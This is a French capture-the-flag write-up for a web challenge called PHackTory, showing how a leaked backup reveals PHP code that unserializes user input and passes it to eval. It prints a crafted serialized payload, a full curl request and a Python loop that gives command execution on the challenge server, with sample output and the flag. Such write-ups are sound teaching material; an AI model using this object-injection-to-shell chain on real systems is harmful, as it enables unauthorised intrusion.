# PHackTory - 256 pts

Énoncé :

> Un nouveau magasin de fabrication de chocolat ouvre en ville. 
>  Soit le premier à passer commande !
>  
>  
>  Lien du challenge : [phacktory.phack.fr](http://phacktory.phack.fr) 
>
>  Artiste : `@Eagleslam`

Le site en question semble être une page statique :

> Votre magasin se prépare pour les fêtes. 
> Les commandes ne sont pas encore ouvertes.

On dirait qu'il n'y a rien à voir... On va scanner le site pour chercher des fichiers intéressants :

```
./dirsearch.py -u http://phacktory.phack.fr/ -e php,txt,zip,html,htm
```

Bingo ! Il y a un `backup.zip` qui traîne à la racine du site !

À l'intérieur du zip, ce code PHP :

```php
<?php

include("config.php");

class PHackTory {
    public $type;
    public $quantity;

    public function __construct() {
        if(isset($_POST['type'])) {
            $this -> type = $_POST['type'];
        } else {
            $this -> order = "milky";
        }

        if(isset($_POST['quantity'])) {
            $this -> quantity = $_POST['quantity'];
        } else {
            $this -> quantity = "50";
        }
    }

    public function __wakeup() {
      global $DEBUG;

      $types = ["dark", "white", "milky", "fruity", "95%", "flag"];
      $quantities = [1, 5, 10, 25, 50, 100, "PHACK{}"];

      if (isset($this -> type) && isset($this -> quantity)) {
        if(in_array($this -> type, $types) && in_array($this -> quantity, $quantities)) {
            prepareOrder($this);
            return "Votre commande de " . $this -> quantity . " chocholats ("  . $this -> type .  ") est en préparation.";
        }
        else {
          if ($DEBUG) {
            //Affichage des variables pour deboguer. Enfin..Je crois que c'est ça que ca fait.
            eval($this -> type . ' ' . $this -> quantity);
          }

          return "Il semble y avoir un problème avec votre commande. Merde de contacter quelqu'un d'autre.";
        }
      }
    }

    public function prepareOrder(){
      // ToDo
    }
}

$a = $_GET['what'];
$b = $_POST['is'];
$c = $_POST['cool'];
$d = $_GET['the'];

?>

<!doctype html>
[...]
    <?php
      if(isset($a) && isset($b) && isset($c) && isset($d)) {
          if($d == "flag" && $a == "is") {
            if ($b > 1538) {
              $myOrder = unserialize($_GET['please']);
              return "Oui !";
            }
            else {
              return "Peut-être !";
            }
          }
          else {
            return "Certainement pas!";
          }
      }
      else {
        return "Non !";
      }
    ?>
  </body>
</html>

```

Alors là si j'étais un gros barbu je taperais la commande curl parfaite du premier coup mais il y a du GET, du POST et surtout de la déserialization alors on ne va pas se prendre la tête : on va copier le code sur un serveur web en local pour le tester dans tous les sens. On active les messages d'erreur, on remplace les `return` par des `echo` et on ajoute des `echo` dans les différentes fonctions pour voir si elles sont appelées.

 Pour accéder au `eval` vulnérable du code il faut donc :

- passer what=is et the=flag GET
- mettre un nombre plus grand que 1538 dans *is* et passer un paramètre *cool* en POST

Cela va déserializer le paramètre *please* envoyé en GET. Et la concaténation des champs *type* et *quantity* seront évaluée si *type* ou *quantity* n'est pas dans la liste hardcodée. Un comportement normal quoi x)

On exécute `echo serialize(new PHackTory);` sur notre serveur web pour voir ce que ça donne (parce que c'est quand même beaucoup plus pratique que de deviner) :

```
O:9:"PHackTory":3:{s:4:"type";N;s:8:"quantity";s:2:"50";s:5:"order";s:5:"milky";}
```

Il suffit donc de remplacer `"type"` et `"quantity"` par la chaîne que l'on veut évaluer (en s'assurant de mettre à jour la longueur des chaîne). Par exemple :

```
O:9:"PHackTory":3:{s:4:"type";s:10:"phpinfo();";s:8:"quantity";s:0:"";s:5:"order";s:5:"milky";}
```

On URL encode ça et si l'on veut respecter les conditions précédemment listées, voici la commande curl :

```
curl "http://phacktory.phack.fr/?what=is&the=flag&please=O%3A9%3A%22PHackTory%22%3A3%3A%7Bs%3A4%3A%22type%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3Bs%3A8%3A%22quantity%22%3Bs%3A0%3A%22%22%3Bs%3A5%3A%22order%22%3Bs%3A5%3A%22milky%22%3B%7D" -d "is=1539&cool=a&type=flag"
```

Et on obtient bien un gros pavé de texte qui correspond au `phpinfo();`.

Maintenant je suis perfectionniste alors je vais me faire le programme suivant pour avoir un shell :

```python
import requests

while True:
    cmd = input("$ ")
    cmd = "system('"+cmd+"');"
    serial = 'O:9:"PHackTory":3:{s:4:"type";s:'+str(len(cmd))+':"'+cmd+'";s:8:"quantity";s:0:"";s:5:"order";s:5:"milky";}'
    print(requests.post("http://phacktory.phack.fr/?what=is&the=flag&please="+serial, data={"is":"1539","cool":"","type":"flag"}).content.decode()[763:])

```

Plus qu'à profiter :)

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls
backup.zip
config-126546845171616835186.php
images
index.php

$ cat config-126546845171616835186.php
<?php

error_reporting(E_ERROR | E_PARSE);
$DEBUG=true;

$FLAG="PHACK{l3s_cl0Ch3s_s0nT_p4s5ees_!}";

?>
```

